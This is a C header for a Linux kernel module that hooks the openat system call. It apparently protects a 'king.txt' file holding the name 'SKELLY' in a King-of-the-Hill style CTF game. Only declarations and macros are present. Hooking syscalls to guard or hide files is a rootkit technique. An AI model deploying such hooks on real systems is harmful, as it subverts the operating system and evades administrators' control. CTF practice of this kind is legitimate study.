#ifndef KING_H
#define KING_H

#include <linux/err.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/path.h>
#include <linux/pid.h>
#include <linux/rwlock.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/version.h>

#include "utils.h"
/* Macros for protecting king.txt */
#define KING_FILENAME "/home/vagrant/king.txt" // Path to king file
#define KING_FILENAME_LEN strlen(KING_FILENAME)

#define KING "SKELLY\n" // King
#define KING_LEN strlen(KING)

extern struct file_operations *king_fops; // NULL
extern rwlock_t king_fops_lock;


/* Declarations for openat hook */
#ifdef PTREGS_SYSCALL_STUBS
extern asmlinkage long (*orig_openat)(const struct pt_regs *);
asmlinkage long hook_openat(const struct pt_regs *regs);
#else
extern asmlinkage long (*orig_openat)(
  int dfd, 
  const char __user *filename,
  int flags, umode_t mode
);

asmlinkage long hook_openat(
  int dfd, 
  const char __user *filename,
  int flags, 
  umode_t mode
);
#endif // PTREGS_SYSCALL_STUBS

#endif // KING_H